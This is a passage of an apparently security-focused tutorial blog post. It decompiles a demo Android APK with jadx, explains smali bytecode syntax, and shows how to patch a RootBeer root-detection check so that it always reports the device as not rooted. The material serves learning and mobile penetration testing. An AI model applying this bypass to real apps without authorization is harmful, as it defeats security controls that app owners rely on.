class="token keyword">if</span><span class="token operator">-</span>ne v0<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token operator">:</span>cond_0    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> p1<span class="token punctuation">,</span> <span class="token number">0x1</span>    <span class="token keyword">return</span> p1    <span class="token punctuation">.</span>line <span class="token number">54</span>    <span class="token operator">:</span>cond_0    invoke<span class="token operator">-</span><span class="token keyword">super</span> <span class="token punctuation">&#123;</span>p0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroidx</span><span class="token operator">/</span>appcompat<span class="token operator">/</span>app<span class="token operator">/</span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result p1    <span class="token keyword">return</span> p1<span class="token punctuation">.</span>end method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If you find it hard to read, that’s normal.</p><p>Smali is the byte code that runs on the Android Dalvik VM and has its own syntax rules. To see the Java code we are familiar with, we need to decompile the Smali code back into Java.</p><h2><span id="decompiling-smali-code-into-java-code-with-jadx">Decompiling Smali Code into Java Code with jadx</span></h2><p>Next, we will use another tool: <a href="https://github.com/skylot/jadx">jadx</a>, which describes itself on GitHub as a “Dex to Java decompiler.”</p><p>I will skip the installation process, and we will use jadx to decompile the APK:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># -r means don't decompile resources</span><span class="token comment"># -d is for destination</span>jadx <span class="token parameter variable">-r</span> demoapp.apk <span class="token parameter variable">-d</span> jadx-demoapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>After running the command, we will see a new folder called <code>jadx-demoapp</code>. We can navigate to <code>sources/com/cymetrics/demo/MainActivity.java</code> and see the following content:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>cymetrics<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">Menu</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">MenuItem</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">androidx<span class="token punctuation">.</span>appcompat<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">AppCompatActivity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">androidx<span class="token punctuation">.</span>appcompat<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Toolbar</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>android<span class="token punctuation">.</span>material<span class="token punctuation">.</span>floatingactionbutton<span class="token punctuation">.</span></span><span class="token class-name">FloatingActionButton</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>android<span class="token punctuation">.</span>material<span class="token punctuation">.</span>snackbar<span class="token punctuation">.</span></span><span class="token class-name">Snackbar</span></span><span class="token punctuation">;</span><span class="token comment">/* loaded from: classes.dex */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setSupportActionBar</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Toolbar</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>toolbar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>fab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.cymetrics.demo.MainActivity.1</span>            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Snackbar</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> <span class="token string">"Replace with your own action"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAction</span><span class="token punctuation">(</span><span class="token string">"Action"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onCreateOptionsMenu</span><span class="token punctuation">(</span><span class="token class-name">Menu</span> menu<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">getMenuInflater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>menu<span class="token punctuation">.</span>menu_main<span class="token punctuation">,</span> menu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">MenuItem</span> menuItem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>menuItem<span class="token punctuation">.</span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>action_settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span>menuItem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This is the content we want to see! Since this APK has not been obfuscated, we can see almost the entire Java file, which is not much different from the original source code.</p><p>To briefly explain obfuscation, it is the process of scrambling the code to make it difficult for people to see what the original code was. For example, changing variable names to meaningless names like aa, bb, cc, dd is the most basic form of obfuscation. In Android development, ProGuard is usually used to obfuscate code.</p><p>The code above is obviously not obfuscated, making it easy for us to see the original logic.</p><p>The code we want to modify is in <code>com/cymetrics/demo/FirstFragment.java</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>cymetrics<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">LayoutInflater</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">ViewGroup</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">TextView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">androidx<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">Fragment</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>scottyab<span class="token punctuation">.</span>rootbeer<span class="token punctuation">.</span></span><span class="token class-name">RootBeer</span></span><span class="token punctuation">;</span><span class="token comment">/* loaded from: classes.dex */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FirstFragment</span> <span class="token keyword">extends</span> <span class="token class-name">Fragment</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.fragment.app.Fragment</span>    <span class="token keyword">public</span> <span class="token class-name">View</span> <span class="token function">onCreateView</span><span class="token punctuation">(</span><span class="token class-name">LayoutInflater</span> layoutInflater<span class="token punctuation">,</span> <span class="token class-name">ViewGroup</span> viewGroup<span class="token punctuation">,</span> <span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> layoutInflater<span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>fragment_first<span class="token punctuation">,</span> viewGroup<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.fragment.app.Fragment</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onViewCreated</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">,</span> <span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onViewCreated</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>        view<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>button_first<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.cymetrics.demo.FirstFragment.1</span>            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">TextView</span> textView <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> view2<span class="token punctuation">.</span><span class="token function">getRootView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>textview_first<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RootBeer</span><span class="token punctuation">(</span>view2<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"Rooted!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"Safe, not rooted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The main logic is in this section:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">TextView</span> textView <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> view2<span class="token punctuation">.</span><span class="token function">getRootView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>textview_first<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RootBeer</span><span class="token punctuation">(</span>view2<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"Rooted!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        textView<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"Safe, not rooted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This section calls a third-party library to check for root access. If root access is detected, it displays “Rooted!” Otherwise, it displays “Safe, not rooted.”</p><p>When studying the code logic, we can look at the Java code. However, if we want to modify the code, it is not as simple as modifying the Java code. We must modify the Smali code directly to repackage the app.</p><h2><span id="modifying-smali-code">Modifying Smali Code</span></h2><p>Do you remember the folder we extracted using Apktool? The Smali code is in there, and the path is <code>smali/com/cymetrics/demo/FirstFragment$1.smali</code>. If we carefully examine the content, we can find the <code>onClick</code> code:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"># virtual methods<span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>locals <span class="token number">2</span>    <span class="token punctuation">.</span>line <span class="token number">32</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">getRootView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object v0    <span class="token keyword">const</span> v1<span class="token punctuation">,</span> <span class="token number">0x7f08011c</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object v0    check<span class="token operator">-</span>cast v0<span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">TextView</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>line <span class="token number">34</span>    <span class="token keyword">new</span><span class="token operator">-</span>instance v1<span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>view<span class="token operator">/</span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Landroid</span><span class="token operator">/</span>content<span class="token operator">/</span><span class="token class-name">Context</span><span class="token punctuation">;</span>    move<span class="token operator">-</span>result<span class="token operator">-</span>object p1    invoke<span class="token operator">-</span>direct <span class="token punctuation">&#123;</span>v1<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Landroid</span><span class="token operator">/</span>content<span class="token operator">/</span><span class="token class-name">Context</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token punctuation">.</span>line <span class="token number">35</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>    move<span class="token operator">-</span>result p1    <span class="token keyword">if</span><span class="token operator">-</span>eqz p1<span class="token punctuation">,</span> <span class="token operator">:</span>cond_0    <span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Rooted!"</span>    <span class="token punctuation">.</span>line <span class="token number">36</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">CharSequence</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">goto</span> <span class="token operator">:</span>goto_0    <span class="token operator">:</span>cond_0    <span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Safe, not rooted"</span>    <span class="token punctuation">.</span>line <span class="token number">38</span>    invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">CharSequence</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token operator">:</span>goto_0    <span class="token keyword">return</span><span class="token operator">-</span><span class="token keyword">void</span><span class="token punctuation">.</span>end method<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This is a brief explanation of some basic smali syntax. <code>.method public onClick(Landroid/view/View;)V</code> means that there is a public method called onClick, which takes a parameter of type <code>android/view/View</code>, and the V at the end of the parentheses means void, indicating that there is no return value.</p><p><code>.locals 2</code> means that this function will use two registers, v0 and v1. If you use v2, it will cause an error. Therefore, if you need more registers, remember to change this part.</p><p>The parameter is represented by p. Usually, p0 represents this, and p1 is the first parameter. Therefore, <code>invoke-virtual &#123;p1&#125;, Landroid/view/View;-&gt;getRootView()Landroid/view/View;</code> calls the <code>getRootView()</code> method with the first parameter.</p><p>The core code in this section is:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>line <span class="token number">35</span>invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>move<span class="token operator">-</span>result p1<span class="token keyword">if</span><span class="token operator">-</span>eqz p1<span class="token punctuation">,</span> <span class="token operator">:</span>cond_0<span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Rooted!"</span><span class="token punctuation">.</span>line <span class="token number">36</span>invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>widget<span class="token operator">/</span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">CharSequence</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span><span class="token keyword">goto</span> <span class="token operator">:</span>goto_0<span class="token operator">:</span>cond_0<span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Safe, not rooted"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if-eqz p1, :cond_0</code> means that if p1 is 0, it will jump to <code>:cond_0</code>, and p1 is the return value of <code>RootBeer-&gt;isRooted()</code>. That is to say, p1 represents the result of the root check, and as long as p1 is changed, different results can be forged.</p><p>There are many ways to change it. For example, changing the original <code>if-eqz</code> to <code>if-nez</code> can reverse the logic, or we can directly change p1 to 0 and add a log to confirm that we have executed here:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>line <span class="token number">35</span>invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>scottyab<span class="token operator">/</span>rootbeer<span class="token operator">/</span><span class="token class-name">RootBeer</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">isRooted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Z</span>move<span class="token operator">-</span>result p1# add log<span class="token punctuation">,</span> print <span class="token string">"we are here"</span><span class="token keyword">const</span><span class="token operator">-</span>string v1<span class="token punctuation">,</span> <span class="token string">"we are here"</span>invoke<span class="token operator">-</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>v1<span class="token punctuation">,</span> v1<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token class-name">Landroid</span><span class="token operator">/</span>util<span class="token operator">/</span><span class="token class-name">Log</span><span class="token punctuation">;</span><span class="token operator">-></span><span class="token function">e</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">I</span># set p1 <span class="token keyword">to</span> <span class="token number">0</span><span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> p1<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token keyword">if</span><span class="token operator">-</span>eqz p1<span class="token punctuation">,</span> <span class="token operator">:</span>cond_0<span class="token keyword">const</span><span class="token operator">-</span>string p1<span class="token punctuation">,</span> <span class="token string">"Rooted!"</span><span class="token punctuation">.</span>line <span class="token number">36</span>invoke<span class="token operator">-</span>virtual <span class="token punctuation">&#123;</span>v0<span class="token punctuation">,</span> p1<span class="token punctuation">&#125;</span><span class="token 